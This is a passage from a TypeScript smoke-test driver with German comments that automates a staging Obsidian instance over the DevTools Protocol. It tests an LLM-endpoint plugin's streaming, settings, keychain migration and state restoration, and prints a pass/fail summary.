  if (modell === null) { unmeasured(name, `auf ${url} ist kein Modell geladen oder der Server antwortet nicht (ein Lauf loeste sonst ein JIT-Laden aus)`); return; }
  const vorher = await cdp.evaluate<{ eps: unknown; choice: unknown; thinking: unknown }>(`
    const l = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.llm;
    const r = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.request;
    return { eps: l.endpoints, choice: l.choice ?? null, thinking: r.thinking.creative ?? null };`);
  try {
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(url)}, model: ${JSON.stringify(modell)} }];
      p.settings.llm.choice = {}; p.settings.request.thinking.creative = "off";
      p.llm.invalidate(); await p.saveSettings();
      return true;`);
    // Ein echtes 7B-Modell schreibt ~35 Zeichen/s: eine volle Deutung (~3800 Zeichen) braucht 110–160 s (gemessen 2026-10-09).
    // Mit 150 s Frist war M4 an einem langsamen Lauf rot, ohne dass etwas kaputt war.
    // Umgeschrieben (Welle 15): vorher wartete M4 auf die FERTIGE Deutung. Ein 7B-Coder-Modell ohne
    // Token-Grenze schrieb am 2026-10-09 in 3 von 7 Laeufen ueber 10 000 Zeichen weiter und liess M4 rot
    // werden, obwohl der Stream lief. Belegt wird jetzt: der Stream liefert Text (>= 400 Zeichen), dann Abbruch.
    const t0 = Date.now();
    const ok = await laufeDeutung(cdp, 240_000, "Smoke M: Endpunkt-Manager", 400);
    const dauer = Math.round((Date.now() - t0) / 1000);
    const laenge = letzteDeutungLaenge;
    record(name, ok && laenge >= 400, ok ? `${laenge} Zeichen Deutung von ${modell} nach ${dauer} s (Stream, danach abgebrochen oder beendet), Anfang: „${letzteDeutungAnfang}“` : "Deutungslauf lieferte kein Ergebnis");
  } finally {
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      const v = ${JSON.stringify(vorher)};
      p.settings.llm.endpoints = v.eps;
      if (v.thinking === null) delete p.settings.request.thinking.creative; else p.settings.request.thinking.creative = v.thinking;
      if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
      p.llm.invalidate(); await p.saveSettings();
      return true;`).catch(() => null);
  }
}

/** Zaehlt Treffer eines Selektors in der Settings-Oberflaeche — Analog zu `zeilenZahl`, aber
 *  mit eigenem Selektor statt `.setting-item` (fuer den lokalen-Editor-Marker). */
async function zeilenZahlSelector(ui: SettingsUi, selector: string): Promise<number> {
  return ui.cdp.evaluate<number>(`
    const wurzel = ${wurzelAusdruck(ui)};
    return wurzel ? wurzel.querySelectorAll(${JSON.stringify(selector)}).length : -1;
  `);
}

// ─── Hauptlauf ─────────────────────────────────────────────────────────────────────

async function main(): Promise<void> {
  const args = parseArgs(process.argv.slice(2));
  const portRoh = args.value("--port");
  const port = Number(portRoh);
  if (portRoh === undefined || !Number.isInteger(port) || port < 1024 || port > 65535) {
    throw new Error(`--port <Zahl> fehlt oder ist ungueltig (${JSON.stringify(portRoh)}). Den Port der eigenen Zweitinstanz angeben (Rezept im Dateikopf, z. B. 9400).`);
  }
  const vault = args.value("--vault") ?? PLUGIN_ID;
  // Gebauter local-image-generator (Ordner mit main.js, manifest.json, styles.css) fuer D10; ohne Flag gilt D10 als uebersprungen.
  const ligDir = args.value("--lig");
  // Optional: das Modell fuer M4 (muss auf :1234 geladen sein); ohne Flag das erste geladene.
  const modellFlag = args.value("--model");

  // `attachTo` waehlt das Fenster mit `app.workspace.rootSplit.doc === document` — `Cdp.attach` nahm das erste
  // Fenster mit passendem Titel und war bei einem Pop-out mit gleichem Titel mehrdeutig.
  const cdp = await attachTo("workspace", port, vault);
  if (!cdp) throw new Error(`Kein Obsidian-Fenster fuer Vault „${vault}“ auf Port ${port} — laeuft die Zweitinstanz (Rezept im Dateikopf)?`);
  const protokoll: string[] = [];
  await cdp.mitschnitt((zeile) => {
    if (/yijing/i.test(zeile)) protokoll.push(zeile);
  });

  // Chromium drosselt Hintergrundfenster — ohne ein sichtbares Fenster misst man ein Phantom. `requireVisible` holt das Fenster
  // dieser Verbindung nach vorn (nicht per `osascript activate`: das trifft die reguläre Instanz statt der Zweitinstanz, gemessen
  // von kl-w19) und bricht mit Meldung ab, wenn es unsichtbar bleibt.
  await cdp.send("Page.enable");
  try {
    await requireVisible(cdp);
  } catch (e) {
    cdp.close();
    throw new Error(e instanceof Error ? e.message : String(e));
  }

  // Ein frischer Staging-Vault startet im Restricted Mode, ein frisches Profil fragt „Dem Ersteller vertrauen“:
  // `bereiteInstanzVor` bestaetigt den Dialog und schaltet frei — nur im eigenen Staging-Vault (`nurVault`,
  // heisst wie das Repo); in einem fremden Vault bleibt es beim Pruefpunkt A1 mit Ansage. `manifest.id` = Repo-Name.
  if (!(await cdp.evaluate<boolean>(`return Boolean(app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]);`))) {
    const r = await bereiteInstanzVor(cdp, { pluginIds: [PLUGIN_ID], nurVault: PLUGIN_ID, sprache: "en" });
    instanzHinweis = r.hinweis;
    console.log(`Instanz vorbereitet: ${r.hinweis}`);
  }

  // Herkunfts-Guard: laeuft dieser Smoke ueberhaupt gegen UNSEREN Build? Der Pfad kommt aus
  // der LAUFENDEN Instanz, nicht aus stagingVaultDir(REPO_NAME) — ein Treiber dockt per
  // --vault an ein beliebiges Fenster an, und ein aus der Konvention abgeleiteter Pfad pruefte
  // im Zweifel eine Datei, die mit dem Lauf nichts zu tun hat (Lesson 2026-09-02,
  // kuro-gamification). `manifest.version` taugt dafuer nicht: Store- und Repo-Build tragen
  // dieselbe Nummer.
  //
  // Die Warnung wird hier NUR gemerkt und unter der Bilanz nochmal ausgegeben — ein
  // console.warn am Anfang eines mehrminuetigen Laufs ist beim Ablesen des Ergebnisses
  // weggescrollt, und dann steht wieder ein sauber aussehendes "N/M gruen" da, das fuer den
  // Repo-Stand nichts belegt (der Zustand vom 2026-08-30, 69 von 150 Punkten).
  // Deklaration VOR dem try, sonst ist sie im finally nicht mehr sichtbar.
  let herkunftsWarnung: string | null = null;

  // Vorwert VOR dem try lesen: nur so ist er auch nach einem Abbruch im finally da.
  const originalData = await readVaultFile(cdp, DATA_PATH);
  if (originalData !== null) await writeVaultFile(cdp, DATA_RESCUE, originalData);
  // Auch der Schluesselbund-Eintrag ist Zustand des Wirts: B8 und F8 schreiben ihn, und die
  // data.json-Ruecksicherung allein liesse den Smoke-Schluessel dort stehen — beim naechsten
  // Laden GEWAENNE er gegen data.json (Schluesselbund hat Vorrang).
  let originalBund = await schluesselbund(cdp);
  const aufraeumen: string[] = [];


  // Alles, was dieser Lauf am Wirt verändert, räumt EIN Schritt zurück: der Normalweg im `finally` (`zustand.schliesse()`),
  // Ctrl-C/SIGTERM über das Abbruch-Modul der Brücke (Hauptzweig gesperrt, dieser Schritt darf noch senden, danach Bilanz,
  // Exit 130). Der zweite Vergleich „NACH dem Reload“ des alten Handlers entfällt: der Hauptzweig kann nicht mehr schreiben.
  const zustandZurueck = async (): Promise<void> => {
    await removeFakeManager(cdp).catch(() => undefined);
    // Anbieter-Slot (Fake oder versteckter echter) zurueck, ein fuer D10 angelegter echter local-image-generator wieder weg.
    await ligSlot(cdp, "zurueck").catch(() => undefined);
    await ligEchtEntfernen(cdp);
    console.log("\n── Aufraeumen ──");
    for (const pfad of aufraeumen) {
      await cdp.evaluate(`
        const f = app.vault.getAbstractFileByPath(${JSON.stringify(pfad)});
        if (f) await app.fileManager.trashFile(f);
        return true;
      `);
      console.log(`  Papierkorb: ${pfad}`);
    }
    if (originalBund) {
      await schluesselbundZuruecksetzen(cdp, originalBund);
      console.log(`  Schluesselbund zurueckgesetzt: ${Object.keys(originalBund).length} Vorwert(e) geschrieben, Neues entfernt`);
    }
    if (originalData !== null) {
      await writeVaultFile(cdp, DATA_PATH, originalData);
      await removeVaultFile(cdp, DATA_RESCUE);
      await reloadPlugin(cdp);
      const wieder = await readVaultFile(cdp, DATA_PATH);
      // Trug die Wirts-data.json noch einen Klartext-Schluessel, migriert ihn der Reload in
      // den Schluesselbund und schreibt data.json neu — das ist die Sache selbst, keine
      // Abweichung. Erkannt daran, dass nur `llm.apiKey` geleert wurde.
      // Trug die Wirts-data.json noch die alte Form (`llm.apiKey`, Endpunkte als Text), migriert der
      // Reload sie und schreibt data.json neu — das ist die Sache selbst, keine Abweichung.
      const migriert = wieder !== originalData && (() => {
        try {
          const a = JSON.parse(originalData) as { llm?: { apiKey?: string; endpoints?: unknown } };
          const b = JSON.parse(wieder ?? "{}") as { llm?: { apiKey?: string; endpoints?: unknown } };
          const alteForm = a.llm?.apiKey !== undefined || typeof a.llm?.endpoints === "string"
            || (Array.isArray(a.llm?.endpoints) && a.llm.endpoints.some((e) => typeof e === "string"));
          return alteForm && b.llm?.apiKey === undefined;
        } catch { return false; }
      })();
      console.log(`  data.json zurueckgeschrieben: ${wieder === originalData ? "byte-gleich" : migriert ? "alte Form des Wirts (Textliste, llm.apiKey) migriert (erwartet)" : "ABWEICHUNG — pruefen!"}`);
    }
    await closeSettings(cdp, null);
  };
  const zustand = beimAbbruch(zustandZurueck, "Wirt-Zustand zurücksetzen");

  try {
    // Der Guard steht FRUEH IM try — beide Haelften sind noetig und ziehen in
    // verschiedene Richtungen:
    //   im try, damit das finally laeuft. Dort haengt `cdp.close()`; ein Guard, der davor
    //     wirft, laesst den CDP-Socket offen. Das ist die Ursache des "haengenden Treibers"
    //     aus der Dach-Messung vom 2026-08-30, die faelschlich als "zu viele Fenster"
    //     gelesen wurde. (Dieser Treiber hatte den Fehler: bis 2026-09-02 stand der Aufruf
    //     VOR dem try — gemeldet von vault-rag, nachgemessen, hier behoben.)
    //   frueh, damit das finally NICHTS ZU TUN hat: `aufraeumen` ist noch leer, und
    //     `originalData` wird unveraendert zurueckgeschrieben. Wer den Guard spaeter
    //     platziert, verliert diese Haelfte.
    const vaultInfo = await cdp.evaluate<{ basePath: string; configDir: string }>(`
      return { basePath: app.vault.adapter.basePath, configDir: app.vault.configDir };
    `);
    requireEigenerBuild(
      join(vaultInfo.basePath, vaultInfo.configDir, "plugins", PLUGIN_ID, "main.js"),
      join(process.cwd(), "main.js"),   // frisch gebaut, sonst sagt der Vergleich nichts
      (meldung) => { herkunftsWarnung = meldung; console.warn(meldung); },
    );

    await abschnittPanel(cdp);

    // B-1 — ein liegen gebliebener Smoke-Schluessel aus einem VOR diesem Handler
    // abgebrochenen Vorlauf (SIGKILL/Absturz) waere sonst still gefaehrlich: B6/B8 lesen
    // `originalBund.wert` als "echten Vorbestand" und schreiben ihn am Ende treu zurueck —
    // der Testschluessel wuerde sich damit selbst verewigen, UND B6/B8 maessen faelschlich
    // gegen den eigenen Rest statt gegen einen frischen Ausgangszustand (Master-Fund,
    // ctrlc-w7b 14:37: die vermeintlich "vorbestehenden" Rot B6/B8 WAREN genau dieser Fall).
    // Marker: alle Testwerte dieses Treibers tragen das Praefix "smoke-".
    const kaputterBund = Object.values(originalBund ?? {}).some((w) => w.startsWith("smoke-"));
    record(
      "B-1 Kein liegen gebliebener Smoke-Schluessel im Schluesselbund aus einem abgebrochenen Vorlauf",
      !kaputterBund,
      kaputterBund
        ? `Schluesselbund trug noch ${JSON.stringify(Object.entries(originalBund ?? {}).filter(([, w]) => w.startsWith("smoke-")))} — entfernt`
        : "Ausgangszustand unauffaellig",
    );
    if (kaputterBund) {
      originalBund = Object.fromEntries(Object.entries(originalBund ?? {}).filter(([, w]) => !w.startsWith("smoke-")));
      await schluesselbundZuruecksetzen(cdp, originalBund);
    }

    await abschnittMigration(cdp);
    await abschnittSettings(cdp, port);
    await abschnittDeklarativ(cdp, port);
    if (args.has("--kein-manager")) {
      for (const n of PUNKTE.filter((x) => /^M[123]/.test(x))) skipped(n, "--kein-manager gesetzt");
    } else {
      await pruefeManager(cdp, port);
      await pruefeTabWechsel(cdp, port);
    }
    await pruefeAnfrage(cdp, port);
    await pruefeModellzeile(cdp);
    if (args.has("--kein-manager")) {
      for (const n of PUNKTE.filter((x) => Z_MANAGER_PUNKT.test(x))) skipped(n, "--kein-manager gesetzt");
    } else {
      await pruefeModellzeileMitManager(cdp);
    }
    await pruefeLinkschutz(cdp, port);
    await pruefeSchutz(cdp, aufraeumen);
    await pruefeDenkblockLive(cdp);
    await pruefeGemma(cdp);
    await pruefeFolgeRegel(cdp);
    await pruefePflicht(cdp);
    await pruefeEchtenEndpunkt(cdp, modellFlag);

    await abschnittBild(cdp, aufraeumen, ligDir);
    await abschnittSpeichern(cdp, aufraeumen);
  } finally {
    await zustand.schliesse();
    // Nach einem Abbruch beendet das Modul den Prozess selbst (Bilanz, Exit 130); dieses finally tut dann nichts mehr.
    if (istAbgebrochen()) return;

    if (protokoll.length) {
      console.log("\n── Renderer-Meldungen (gefiltert auf yijing) ──");
      for (const z of protokoll.slice(0, 20)) console.log(`  ${z}`);
    }

    // Die Abschlusszeile traegt alle vier Zustaende: ein uebersprungener oder nie gemessener Punkt gehoert IN sie,
    // sonst wird aus „60 gruen“ beim Zitieren ein vollstaendiger Lauf. `abschluss()` setzt Exit 1 bei Rot ODER
    // nichts gemessen; ein Abbruch vor der ersten Messung zaehlt dabei alle Punkte als „nichts gemessen“.
    bilanz.abschluss();
    for (const p of bilanz.eintraege()) {
      if (p.zustand === "rot" || p.zustand === "nichts-gemessen") console.log(`  ${p.name} — ${p.detail}`);
    }
    if (herkunftsWarnung) {
      console.log(`\n⚠️  Diese Bilanz ist NICHT fuer den Repo-Stand belegt: ${herkunftsWarnung}`);
    }
    cdp.close();
  }
}

runDriver(main);
